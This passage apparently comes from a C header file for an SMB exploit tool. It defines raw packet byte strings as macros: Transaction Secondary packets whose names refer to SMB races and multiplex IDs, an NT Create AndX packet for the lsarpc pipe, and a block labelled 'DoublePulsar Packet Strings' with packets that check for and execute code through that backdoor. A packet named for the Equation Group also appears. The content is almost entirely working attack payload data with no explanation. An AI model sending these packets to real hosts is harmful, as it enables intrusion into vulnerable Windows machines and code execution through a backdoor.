"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x42\x00\xe3\x00\x10" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x43\xff\x53\x4d\x42\x26\x00\x00\x00\x00\x18\x07" \
"\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0c" \
"\x28\x00\x08\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x01\x00\x42\x00\x01\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x42\xff\x53\x4d\x42" \
"\x26\x00\x00\x00\x00\x18\x07\xc0\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x08\x0c\x28\x00\x08\x5c\x00\x08\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"


#define TRANS_SECONDARY_MULTI_SMB_RACE_TYPE_TWO_PACKET_SIZE	286

#define TRANS_SECONDARY_THIRD_MID_ZERO_PACKET	"\x00\x00\x00\x6a\xff\x53\x4d\x42\x26\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0c\x28" \
"\x00\x08\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x28" \
"\x00\x42\x00\x88\x00\x37\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x50\xd4\x68\x06\x80\xf8\xff\xff\x04\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00"

#define TRANS_SECONDARY_THIRD_MID_ZERO_PACKET_SIZE	110

#define TRANS_SECONDARY_SECOND_MULTI_SMB_RACE_TYPE_TWO_PACKET	"\x00\x00\x00\x46\xff\x53\x4d\x42\x26\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0c\x28" \
"\x00\x08\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04" \
"\x00\x42\x00\x54\x00\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x23\x00\x00\x40\x00\x00\x00\x43\xff\x53" \
"\x4d\x42\x26\x00\x00\x00\x00\x18\x07\xc0\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x08\x0c\x28\x00\x08\x00\x00\x08\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x42\x00\xe3\x00\x10" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x43\xff\x53\x4d\x42\x26\x00\x00\x00\x00\x18\x07" \
"\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0c" \
"\x28\x00\x08\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x01\x00\x42\x00\x01\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x42\xff\x53\x4d\x42" \
"\x26\x00\x00\x00\x00\x18\x07\xc0\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x08\x0c\x28\x00\x08\x5c\x00\x08\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

#define TRANS_SECONDARY_SECOND_MULTI_SMB_RACE_TYPE_TWO_PACKET_SIZE 286


#define TRANS_SECONDARY_FOURTH_MID_ZERO_PACKET "\x00\x00\x00\x6a\xff\x53\x4d\x42\x26\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0c\x28" \
"\x00\x08\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x28" \
"\x00\x42\x00\x88\x00\x37\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x50\xd6\x68\x06\x80\xf8\xff\xff\x04\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00"

#define TRANS_SECONDARY_FOURTH_MID_ZERO_PACKET_SIZE 110


#define TRANS_SECONDARY_THIRD_MULTI_SMB_RACE_TYPE_TWO_PACKET "\x00\x00\x00\x46\xff\x53\x4d\x42\x26\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0c\x28" \
"\x00\x08\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04" \
"\x00\x42\x00\x54\x00\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x23\x00\x00\x40\x00\x00\x00\x43\xff\x53" \
"\x4d\x42\x26\x00\x00\x00\x00\x18\x07\xc0\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x08\x0c\x28\x00\x08\x00\x00\x08\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x42\x00\xe3\x00\x10" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x43\xff\x53\x4d\x42\x26\x00\x00\x00\x00\x18\x07" \
"\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0c" \
"\x28\x00\x08\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x01\x00\x42\x00\x01\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x42\xff\x53\x4d\x42" \
"\x26\x00\x00\x00\x00\x18\x07\xc0\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x08\x0c\x28\x00\x08\x5c\x00\x08\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

#define TRANS_SECONDARY_THIRD_MULTI_SMB_RACE_TYPE_TWO_PACKET_SIZE 286


#define SECOND_NT_CREATE_ANDX_PACKET "\x00\x00\x00\x62\xff\x53\x4d\x42\xa2\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0c\x28" \
"\x00\x08\x80\x00\x18\xff\x00\x62\x00\x00\x0c\x00\x16\x00\x00\x00" \
"\x00\x00\x00\x00\x9f\x01\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x03\x00\x00\x00\x01\x00\x00\x00\x40\x00\x00\x00" \
"\x02\x00\x00\x00\x03\x0f\x00\x00\x6c\x00\x73\x00\x61\x00\x72\x00" \
"\x70\x00\x63\x00\x00\x00"

#define SECOND_NT_CREATE_ANDX_PACKET_SIZE	102

#define TRANS_SECONDARY_FIFTH_MID_ZERO_PACKET	"\x00\x00\x00\x62\xff\x53\x4d\x42\x26\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0c\x28" \
"\x00\x08\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20" \
"\x00\x42\x00\x90\x00\x2f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x01\x00\x00"

#define TRANS_SECONDARY_FIFTH_MID_ZERO_PACKET_SIZE 102





/*
 *
 *
 *	DoublePulsar Packet Strings
 *
 *
 */

#define DOUBLE_PULSAR_CHECK_TRANS2_SESSION_SETUP_PACKET "\x00\x00\x00\x4e\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xfe" \
"\x00\x08\x41\x00\x0f\x0c\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00" \
"\x00\x77\xbf\xed\x00\x00\x00\x0c\x00\x42\x00\x00\x00\x4e\x00\x01" \
"\x00\x0e\x00\x0d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00"

#define DOUBLE_PULSAR_CHECK_TRANS2_SESSION_SETUP_PACKET_SIZE 82

#define DOUBLE_PULSAR_EXEC_TRANS2_SESSION_SETUP_FIRST_PACKET \
"\x00\x00\x10\x4e\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xfe" \
"\x00\x08\x42\x00\x0f\x0c\x00\x00\x10\x01\x00\x00\x00\x00\x00\x00" \
"\x00\x66\xb8\xaa\x00\x00\x00\x0c\x00\x42\x00\x00\x10\x4e\x00\x01" \
"\x00\x0e\x00\x0d\x10\x00\xce\x75\x60\x63\xce\x27\x60\x63\xce\x37" \
"\x60\x63"

#define DOUBLE_PULSAR_EXEC_TRANS2_SESSION_SETUP_FIRST_PACKET_SIZE   82




#define DOUBLE_PULSAR_TREE_DISCONNECT_PACKET "\x00\x00\x00\x23\xff\x53\x4d\x42\x71\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xfe" \
"\x00\x08\x41\x00\x00\x00\x00"

#define DOUBLE_PULSAR_TREE_DISCONNECT_PACKET_SIZE 39


#define DOUBLE_PULSAR_LOGOFF_ANDX_PACKET "\x00\x00\x00\x27\xff\x53\x4d\x42\x74\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xfe" \
"\x00\x08\x41\x00\x02\xff\x00\x27\x00\x00\x00"

#define DOUBLE_PULSAR_LOGOFF_ANDX_PACKET_SIZE 43





#define EQUATION_GROUP_TRANS_PEEK_NAMEDPIPE_PACKET "\x00\x00\x00\x4b\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x18\x45\x68" \
"\x00\x00\xb9\x10\x4f\xef\x85\x1a\xb6\x20\x00\x00\x00\x08\x09\x5a" \
"\x02\x08\x01\x00\x10\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4a\x00\x00\x00\x4a\x00\x02" \
"\x00\x23\x00\x00\x00\x07\x00\x5c\x50\x49\x50\x45\x5c\x00\x00"


#define EQUATION_GROUP_TRANS_PEEK_NAMEDPIPE_PACKET_SIZE	79